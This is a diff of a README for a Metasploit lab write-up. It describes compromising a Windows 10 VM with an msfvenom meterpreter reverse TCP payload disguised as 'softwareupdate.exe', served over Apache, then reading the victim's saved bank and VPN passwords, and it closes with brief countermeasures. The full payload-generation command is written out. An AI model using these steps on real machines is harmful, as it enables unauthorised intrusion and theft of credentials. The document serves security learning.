@@ -2,7 +2,7 @@
 
 ## Objective
 
-In this lab, I will exploit a Windows 10 system using the Metasploit Framework on Kali Linux. By doing so, I will have near-complete access to the victim machine through a reverse TCP shell. Once the shell is established, I will then demonstrate the ability to read directories and files on the target machine. 
+In this lab, I will exploit a Windows 10 system using the Metasploit Framework on Kali Linux. By doing so, I will have near-complete access to the victim machine through a reverse TCP shell. Once the shell is established, I will then demonstrate the ability to search the target machine for any information I can use to my advantage.
 
 The steps below can be followed in order to achieve the same results. 
 
@@ -29,7 +29,7 @@ Before creating the payload, I need to make a note of my Kali system's IP addres
 
 You can see above that the IP address for Machine A is "10.0.2.15".
 
-## Payload Creation
+## Weaponization/Payload Creation
 Now that the IP address is identified, I need to create the executable payload that will be used to establish the reverse TCP shell. In order to do so, I can use the Metasploit's "msfvenom" command. Msfvenom is a metasploit command that allows users to create custom payloads for their targets. 
 
 Our target machine is a Windows 10 system so I will be using Msfvenom's Windows Reverse Shell Command. The command is as follows: "msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform win -f exe LHOST=10.0.2.15 LPORT=4444 -o /home/kali/softwareupdate.exe"
@@ -71,13 +71,42 @@ Now that the malicious payload was created and the listener is active, I need to
 
 ![starting apache2](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/04bf87a0-714a-4463-9980-485b14405710)
 
+## Installation
+The target machine will navigate to the apache web server that I have created and the malicious executable will begin downloading. 
+
+![Windows 10 social engineering 2](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/339c82ec-5d76-41ed-82da-5a795b8c90f6)
+
+## Command and Control
+
+Once the file is ran, I am able to see the connection has been established on my Kali machine.
+
+![Session Established](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/95bfb018-6465-4c3d-821b-80b7a4f5f085)
+
+## Actions on Objectives
+With the connection established, I now have complete control over the victim machine. I can create directories, create users, transfer files and more. I can also make the reverse tcp shell persistent so the session is never lost.
+
+Now that I have access I want to search the victim's machine for any information I can take advantage of. Using the command line, I viewed the target machine's users, accessed the machine's desktop and noticed the target had a "Passwords.txt" file saved to their desktop. 
+
+![reading passwords file on desktop](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/39e485a7-4236-4bea-a37e-9c75be5bdea2)
+
+Using the "cat" command in Linux, I am able to view the "Passwords.txt" file and see the target had there bank login information saved and their companie's VPN login.
+
+Now that I have information I can take advantage of, I am going to close the session.
+
+![closing session](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/394932ae-5a7f-4542-a23f-1f81fc2b042d)
+
+### Summary
+Using Metasploit on a Kali Linux machine, I was able to create a malicious payload that allowed me to establish a remote tcp shell connection with my target machine. I used Msfvenom to create the payload and then used msfconsole to create a listenser on my attacking machine. I then started a web server to host my malicious file. Once my target machine sent an HTTP request to my web server, the executable file was installed to the target machine. Unknowingly, the target machine user opened the executable file and started the reverse tcp shell session. 
+
+Now that the session was opened, I had full access to the target machine. I searched through its user's, accessed its desktop directory, and found vulnerable information. 
+
+### Counter Measures
+To avoid an attack like this, it is extremely important to have a strict firewall and an up to date antivirus/operating system.
+
+Following the above steps, an up to date Windows 10 machine with Windows Defender will block the installation of the executable file I created. It's not possible for the user to ignore Windows Defender and proceed anyway. The antivirus immediately detects that its a malicious file and will not let the installation occur. In order to conduct this project, I needed to deactivate Windows Defender completely.  
 
 
-
-
-
-## Reverse TCP Shell
-A reverse TCP shell is a type of shell session initiated by the target machine connecting back to the attacker's machine. By initiating a reverse TCP shell, the attacker will gain remote control over the compromised system. This allows the attacker capabilities to execute commands on the target machine and even transfer of data between both macines. 
+This project was extremely fun and insightful, I hope you enjoyed. 
 
 
 
